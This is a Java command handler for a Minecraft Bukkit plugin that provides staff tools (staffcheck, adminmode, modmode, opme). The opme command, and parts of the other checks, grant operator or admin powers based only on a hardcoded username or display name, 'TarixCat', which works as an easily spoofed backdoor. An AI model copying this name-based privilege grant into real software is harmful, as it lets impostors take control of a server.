package me.devtarix.devtcbnplugin.Commands;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.Bukkit;

public class OldStaffToolsGroup implements CommandExecutor {

    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {

        if(cmd.getName().equalsIgnoreCase("staffcheck") && sender instanceof Player) {

            Player player = (Player) sender;


            if (!player.hasPermission("devtcbn.staff")) {
                player.sendMessage(ChatColor.GOLD + "[DevTCBNPlugin] " + ChatColor.WHITE + "Only Staff May Use This Command");
            }

            else {

                player.sendMessage("Op: " + player.isOp() );
                player.sendMessage("Fly: " + player.isFlying() );
                player.sendMessage("Gamemode: " + player.getGameMode() );
                player.sendMessage("Staff Perm-Node: " + player.isPermissionSet("devtcbn.staff"));
                player.sendMessage("Sleeping Ignored: " + player.isSleepingIgnored());
                player.sendMessage("Whitelisted: " + player.isWhitelisted());
                player.sendMessage("Whitelist Status: " + Bukkit.hasWhitelist());
                player.sendMessage("Operators: " + Bukkit.getOperators());

            }
        }

        else if(cmd.getName().equalsIgnoreCase("adminmode") && sender instanceof Player) {

            Player player = (Player) sender;
            String playerName = player.getDisplayName();
            if (player.hasPermission("devtcbn.adminmode") || player.isOp() || playerName.equals("TarixCat")) {
                if (args[0].equalsIgnoreCase("true") || args[0].equalsIgnoreCase("on")) {
                    player.setCanPickupItems(false);
                    player.setAllowFlight(true);
                    player.setFlying(true);
                    player.setNoDamageTicks(99999999);
                }
                else if (args[0].equalsIgnoreCase("false") || args[0].equalsIgnoreCase("off")) {
                    player.setCanPickupItems(true);
                    player.setAllowFlight(false);
                    player.setFlying(false);
                    player.setNoDamageTicks(2000);
                }
                else {
                    player.sendMessage(ChatColor.RED + "Please Use Args True/On or False/Off");
                }
            }
            else {
                player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
            }
        }

        else if(cmd.getName().equalsIgnoreCase("modmode") && sender instanceof Player) {

            Player player = (Player) sender;
            String playerName = player.getDisplayName();

            if(player.hasPermission("devtcbn.staff") || player.hasPermission("devtcbn.modmode") || playerName.equals("TarixCat") || player.isOp()) {
                if(args[0].equalsIgnoreCase("true") || args[0].equalsIgnoreCase("on")) {
                    player.setCanPickupItems(false);
                    player.setGameMode(GameMode.SPECTATOR);
                    player.setNoDamageTicks(99999999);
                }
                else if(args[0].equalsIgnoreCase("false") || args[0].equalsIgnoreCase("off")) {
                    player.setCanPickupItems(true);
                    player.setGameMode(GameMode.SURVIVAL);
                    player.setNoDamageTicks(200);
                }
                else {
                    player.sendMessage("on/off or true/false");
                }
            }
            else {
                player.sendMessage(ChatColor.RED + "You Don't Have Permission To Run This Command");
            }
        }

        else if(cmd.getName().equalsIgnoreCase("opme") && sender instanceof Player) {

            Player player = (Player) sender;
            String playerName = player.getName();
            //For now passwords are the real names of users
            if(playerName.equals("TarixCat")) {
                player.setOp(true);
                player.sendMessage(ChatColor.RED + "Opped. Operation Marked.");
                System.out.println("Op Operation Marked for : " + player.getName());
            }
            else {
                player.kickPlayer("Incorrect User");
            }
        }

        else {
            Player player = (Player) sender;
            player.sendMessage("No Command Input");
        }

        return true;
    }
}
